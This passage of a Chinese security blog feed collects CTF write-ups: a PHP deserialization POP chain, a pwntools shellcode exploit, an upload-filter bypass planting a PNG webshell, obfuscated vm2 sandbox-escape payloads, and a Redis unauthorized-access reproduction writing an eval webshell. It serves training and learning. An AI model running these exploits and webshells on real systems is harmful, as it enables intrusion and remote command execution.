&quot;password&quot;: payload            &#125;            response = requests.post(url, data=data)            if response.status_code == 500:                print(&quot;success!&quot;)                result = result + i                res2 = result                print(res2.replace(&quot;\\&quot;,&quot;&quot;))                break            elif response.status_code == 0:                continue            else:                continue</code></pre><p>可得到账号密码:</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/7%25@@JT7XEDZVT%5DEG%7D%7BJWNSG.png" alt="img"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010207219.png" alt="image-20220604010207219"></p><pre><code>nssctfwabbybaboo!@$%!!PAssw40d_Y0u3_Never_Konwn!@!!</code></pre><p>进去后得到一串乱码文件</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010331417.png" alt="image-20220604010331417"></p><p>查看源代码</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010813177.png" alt="image-20220604010813177"></p><p>发现是phpjiami加密</p><p>github有相应的工具:<a href="https://github.com/wenshui2008/phpjiami_decode">https://github.com/wenshui2008/phpjiami_decode</a></p><p>但是如果直接复制粘贴下来解密大部分情况都会漏字符，而phpjiami这里解密相对比较苛刻，少一个字符都会解密失败，可以采用脚本把混淆代码保存下来再解密，把url和cookie改成你的就可以了</p><pre><code class="php">&lt;?php$url =&quot;http://1.14.71.254:28470/login.php&quot;;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true);curl_setopt ($ch, CURLOPT_COOKIE, &quot;_ga=GA1.1.1492528755.1648872076; session=6fdc00cf-2ec3-4924-b99b-b474ac227c2d; PHPSESSID=cbdac7b296d255ad4c2c69066c4356ec&quot;);$result = curl_exec($ch);curl_close($ch);echo urlencode($result);file_put_contents(&quot;pop.php&quot;,$result);?&gt;</code></pre><p>将生成的文件放入解密脚本</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604013234468.png" alt="image-20220604013234468"></p><p>最终得到一下代码</p><pre><code class="php">&lt;?phpsession_start();if(!isset($_SESSION[&#39;login&#39;]))&#123;    die();&#125;function Al($classname)&#123;    include $classname.&quot;.php&quot;;&#125;if(isset($_REQUEST[&#39;a&#39;]))&#123;    $c = $_REQUEST[&#39;a&#39;];    $o = unserialize($c);    if($o === false) &#123;        die(&quot;Error Format&quot;);    &#125;else&#123;        spl_autoload_register(&#39;Al&#39;);        $o = unserialize($c);        $raw = serialize($o);        if(preg_match(&quot;/Some/i&quot;,$raw))&#123;            throw new Error(&quot;Error&quot;);        &#125;        $o = unserialize($raw);        var_dump($o);    &#125;&#125;else &#123;    echo file_get_contents(&quot;SomeClass.php&quot;);&#125;</code></pre><p>访问:</p><pre><code>view-source:http://1.14.71.254:28470/1Nd3x_Y0u_N3v3R_Kn0W.php</code></pre><p>可得到someclass的代码</p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;?&gt;</code></pre><p>构造pop链，进行反序列化</p><p><strong>spl_autoload_register的作用就是把后面反序列化不存在的类所在的文件加载进来</strong></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604015509088.png" alt="image-20220604015509088"></p><p>由于漏洞代码在SomeClass.php中，所以我们必须包含这个文件。</p><p>这里存在一个过滤</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170012434.png" alt="image-20220604170012434"></p><p>我们需要让它包含后直接进入destruct魔术函数</p><p>关于gc回收机制可参考这篇文章，写的非常好:<a href="https://blog.csdn.net/qq_51295677/article/details/123520193">https://blog.csdn.net/qq_51295677/article/details/123520193</a></p><p>pop链条的思路非常清晰：</p><pre><code>E的destruct --&gt; B 的toString --&gt; A(rce点)</code></pre><p>最终exp:</p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;class SomeClass&#123;    public $a;&#125;$a = new A();$b = new B();$e = new E();$e -&gt;a = $b; #die函数会把$b当作字符串输出，从而调用了toString魔术方法$b -&gt;a = $a;$arr = new ArrayObject(); #只要是php的原生类即可$arr -&gt; a = &quot;system&quot;;$arr -&gt; b = &quot;ls /&quot;;$a -&gt;b = $arr;$c = new SomeClass();$c -&gt;a =$e;echo(urlencode(str_replace(&quot;i:1&quot;,&quot;i:0&quot;,serialize(array($c,1)))))?&gt;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604165811456.png" alt="image-20220604165811456"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170425296.png" alt="image-20220604170425296"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p>case1,确保unk_202028和unk_202024为1，</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174222620.png" alt="image-20220529174222620"></p><p>case2:，unk_202028和unk_202028为1的时候执行写的shellcode，shellcode必须为可见字符：</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174438381.png" alt="image-20220529174438381"></p><p>生成shellcode可见字符串：</p><p><a href="https://github.com/TaQini/alpha3">https://github.com/TaQini/alpha3</a></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140033280.png" alt="image-20220529140033280"></p><p>exp：</p><pre><code class="python">from pwn import*context.log_level = &quot;debug&quot;io = remote(&quot;123.56.111.202&quot;,17395)# io = process(&quot;./login&quot;)io.recv()shellcode = &quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;payload = &quot;opt:1\n&quot; + &quot;msg:ro0t1\n&quot;io.sendline(payload)payload = &quot;opt:2\n&quot; + &quot;msg:&quot; + shellcode + &quot;\n&quot;io.sendline(payload)io.interactive()</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140131706.png" alt="image-20220529140131706"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>swift的AST树</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201512778.png" alt="image-20220529201512778"></p><p>参照swiftc的输出</p><p>构造出脚本</p><pre><code class="c">#include &lt;stdio.h&gt;unsigned char b[] = &#123;88, 35, 88, 225, 7, 201, 57, 94, 77, 56, 75, 168, 72, 218, 64, 91, 16, 101, 32, 207, 73, 130, 74, 128, 76, 201, 16, 248, 41, 205, 103, 84, 91, 99, 79, 202, 22, 131, 63, 255, 20, 16&#125;;unsigned char k[] = &quot;345y&quot;;int main()&#123;    for (int i = 0; i &lt; 42 - 3; i++)    &#123;        unsigned char tmp = k[0];        k[0] = k[1];        k[1] = k[2];        k[2] = k[3];        k[3] = tmp;    &#125;    for (int i = 42 - 4; i &gt;= 0; i--)    &#123;        unsigned char r0 = b[i + 0], r1 = b[i + 1], r2 = b[i + 2], r3 = b[i + 3];        unsigned char tmp = k[3];        k[3] = k[2];        k[2] = k[1];        k[1] = k[0];        k[0] = tmp;        b[i + 0] = r2 ^ k[2];        b[i + 1] = r3 ^ k[3];        b[i + 2] = ((k[0] + (b[i + 0] &gt;&gt; 4)) &amp; 0xff) ^ r0;        b[i + 3] = ((k[1] + (b[i + 1] &gt;&gt; 2)) &amp; 0xff) ^ r1;    &#125;    for (int i = 0; i &lt; 42; i++)    &#123;        printf(&quot;%c&quot;, b[i]);    &#125;    return 0;&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201614424.png" alt="image-20220529201614424"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web随缘刷</title>
      <link href="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/"/>
      <url>/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/</url>
      
        <content type="html"><![CDATA[<p>唉，ciscn快开了，ctf太卷了，做做以前题练一下手吧</p><p>[TOC]</p><h1 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h1><p>源码:</p><pre><code class="php">&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) &#123;    if ($_FILES[&#39;postedFile&#39;][&#39;size&#39;] &gt; 1024*512) &#123;        die(&quot;这么大个的东西你是想d我吗？&quot;);    &#125;    $imageinfo = getimagesize($_FILES[&#39;postedFile&#39;][&#39;tmp_name&#39;]);    if ($imageinfo === FALSE) &#123;        die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;);    &#125;    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;        die(&quot;东西不能方方正正的话就很讨厌&quot;);    &#125;    $fileName=urldecode($_FILES[&#39;postedFile&#39;][&#39;name&#39;]);    if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123;        die(&quot;有些东西让你传上去的话那可不得了&quot;);    &#125;    $imagePath = &quot;image/&quot; . mb_strtolower($fileName);    if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123;        echo &quot;upload success, image at $imagePath&quot;;    &#125; else &#123;        die(&quot;传都没有传上去&quot;);    &#125;&#125;</code></pre><p>审计下这个代码，传一个文件，校验大小–&gt;校验图片高和宽–&gt;过滤’c’,’i’,’h’,’ph’–&gt;成功上传or失败</p><p>无法上传php🐎，无法利用.htacess和.user.ini，</p><p>那就</p><p>扫描一下目录，又发现了一个源码</p><p>example.php</p><pre><code class="php"> &lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) &#123;    $zip = new \ZipArchive();    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;        die(&quot;要不咱们再看看？&quot;);    &#125;    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;        die (&quot;都不能解压呢&quot;);    &#125;    echo &quot;可以解压，我想想存哪里&quot;;    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);    $zip-&gt;extractTo($pos_for_zip);    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(&quot;$pos_for_zip/*&quot;);    foreach($files as $file)&#123;        if (is_dir($file)) &#123;            continue;        &#125;        $first = imagecreatefrompng($file);        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [&#39;x&#39; =&gt; 0, &#39;y&#39; =&gt; 0, &#39;width&#39; =&gt; $size, &#39;height&#39; =&gt; $size]);        if ($second !== FALSE) &#123;            $final_name = pathinfo($file)[&quot;basename&quot;];            imagepng($second, &#39;example/&#39;.$final_name);            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p>这段代码的大致作用是解压一个zip文件，那我们就要思考是否可以把php放入zip中，那就需要我们上传一个zip文件，但是i被过滤</p><p>这里可以利用mb_strtolower函数绕过，它是支持Unicode的</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123323158.png" alt="image-20220519123323158"></p><p>大致的意思就是我们可以用一个字符Unicode去替换i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123635184.png" alt="image-20220519123635184"></p><pre><code class="php">&lt;?phpvar_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);?&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123728624.png" alt="image-20220519123728624"></p><p>详见:<a href="https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/">https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/</a></p><p>绕过了i之后我们还要绕过高和宽</p><p>我们可以利用xmb绕过</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>除此之外它还有一个函数过滤，阻止我们在图片中放入恶意的php</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519124806416.png" alt="image-20220519124806416"></p><p>通常，系统在实现图片上传功能时，为了防范用户上传含有恶意 php 代码的图片，可采用 gd 库重建图片，gd 库重建图片的一系列函数 imagecreatefrom*，会检查图片规范，验证图片合法性，以此抵御图片中含有恶意 php 代码的攻击。</p><p>如果直接在图片最后写一个一句话木马，会被GD库给去掉。绕过GD库可以参考这篇文章：<a href="http://www.vuln.cn/6411">http://www.vuln.cn/6411</a></p><p>我们可以使用工具:<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator%E6%9D%A5%E5%B8%AE%E5%8A%A9%E6%88%91%E4%BB%AC%E7%BB%95%E8%BF%87">https://github.com/huntergregal/PNG-IDAT-Payload-Generator来帮助我们绕过</a></p><p>使用脚本生成图片🐎</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125046671.png" alt="image-20220519125046671"></p><p>修改后缀为php并放入zip中</p><p>创建一个txt文件，里面写入</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>注:第一行要空出来换行，不然无法识别</p><p>然后将txt追加到zip后</p><pre><code>copy shell.zip/b+1.txt/a dd.zip</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130016829.png" alt="image-20220519130016829"></p><p>然后就可以来上传了</p><p>自己构建一个html post文件上传界面:</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://05b1ebab-02ca-4b72-bf12-1b21695d609d.node4.buuoj.cn:81/upload.php?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125541638.png" alt="image-20220519125541638"></p><p>抓包，修改i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130133680.png" alt="image-20220519130133680"></p><p>成功上传</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130059694.png" alt="image-20220519130059694"></p><p>然后使用example页面解压</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519133936518.png" alt="image-20220519133936518"></p><p>成功解压，运行下</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134029090.png" alt="image-20220519134029090"></p><p>下面来找flag</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134213040.png" alt="image-20220519134213040"></p><p>读取下这个文件</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134241496.png" alt="image-20220519134241496"></p><h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519144418792.png" alt="image-20220519144418792"></p><p>真的是php吗？</p><p>既然这么提示了那肯定不是，测一下node.js</p><p>传入 Error().stack</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519145031732.png" alt="image-20220519145031732"></p><p>确实是js，是vm2的沙箱逃逸问题</p><p>github有现成poc:</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>或者</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    try&#123;        Buffer.from(new Proxy(&#123;&#125;, &#123;            getOwnPropertyDescriptor()&#123;                throw f=&gt;f.constructor(&quot;return process&quot;)();            &#125;        &#125;));    &#125;catch(e)&#123;        return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>构造成function传入</p><pre><code class="js">(function() &#123;        &quot;use strict&quot;;    const &#123;VM&#125; = require(&#39;vm2&#39;);    const untrusted = &#39;(&#39; + function()&#123;        TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();        try&#123;            Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;        &#125;catch(e)&#123;            return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();        &#125;    &#125;+&#39;)()&#39;;    try&#123;        console.log(new VM().run(untrusted));    &#125;catch(x)&#123;        console.log(x);    &#125;&#125;)()</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519150121586.png" alt="image-20220519150121586"></p><p>应该关键字被过滤了</p><p>绕过:</p><p>1、在关键字字母上加上 `</p><pre><code class="js">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+/flag`)[`toString`](); &#125; &#125;)()</code></pre><p>2、javascript的模版文字绕过</p><p>prototype变成`${`${`prototyp`}e`}`</p><pre><code class="js">(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis未授权访问漏洞复现</title>
      <link href="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h1><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和  hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove  及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached  一样，为了保证效率，数据都是缓存在内存中。区别的是 redis  会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis  的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis  服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。目前比较主流的案例：yam2 minerd  挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马。</p><h1 id="漏洞产生条件"><a href="#漏洞产生条件" class="headerlink" title="漏洞产生条件"></a>漏洞产生条件</h1><p>1、redis服务绑定在0.0.0.0:6379端口，而且信任了其他IP，导致了Redis服务暴露在公网上</p><p>2、没有设置密码认证，可以免密登陆Redis服务</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>1、导致敏感信息泄露，恶意执行flushall清空所有数据</p><p>2、通过Eval执行Lua代码，通过备份功能往磁盘写入后门文件</p><p>3、如果Redis服务以root身份运行，可以给root用户写入SSH公钥文件，直接通过SSH登陆服务器</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶机: centos7.5 阿里云 39.105.x.x    建议用centos</p><p>攻击机: kali2022 </p><p>redis 3.2.11</p><p>1.下载安装redis</p><pre><code>wget http://download.redis.io/releases/redis-3.2.11.tar.gz</code></pre><p>2.解压压缩包</p><pre><code>tar zxvf redis-3.2.11.tar.gz</code></pre><p>3.进入解压目录redis-3.2.11 执行make命令</p><pre><code>cd redis-3.2.11make</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426232909091.png" alt="image-20220426232909091"></p><p>4.进入src目录</p><pre><code>cd src</code></pre><p>5.将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</p><pre><code>cp redis-server /usr/bin/cp redis-cli /usr/bin/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426233508159.png" alt="image-20220426233508159"></p><p>6.返回目录redis-3.2.11,将redis.conf拷贝到/etc/目录下</p><pre><code>cd ..cp redis.conf /etc/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234155118.png" alt="image-20220426234155118"></p><p>7.使用/etc/目录下的redis.conf文件中的配置启动redis服务</p><pre><code>redis-server /etc/redis.conf</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234331895.png" alt="image-20220426234331895"></p><p>8.编辑etc中的redis配置文件redis.conf</p><pre><code>vim /etc/redis.conf</code></pre><p>去掉ip绑定，允许除本地外的主机远程登录redis服务 前面加#注释掉</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430165832466.png" alt="image-20220430165832466"></p><p>关闭保护模式，允许远程连接redis服务将yes 改为no</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426235216372.png" alt="image-20220426235216372"></p><p>最后重启下redis服务就ok</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先测试下目标靶机是否存在未授权访问</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430174535586.png" alt="image-20220430174535586"></p><p>成功连接上了，下面开始进一步利用</p><h2 id="1-写入webshell"><a href="#1-写入webshell" class="headerlink" title="1.写入webshell"></a><strong>1.写入webshell</strong></h2><p>写入一句话木马需要我们知道网站的根目录相对于服务器的绝对路径</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180627722.png" alt="image-20220430180627722"></p><pre><code>config set dir /www/wwwroot/39.105.71.63/config set dbfilename sakura.phpset webshell &quot;&lt;?php @eval($_POST[&#39;pass&#39;]) ?&gt;&quot;save</code></pre><p>我的网站上成功出现了这个文件</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180643451.png" 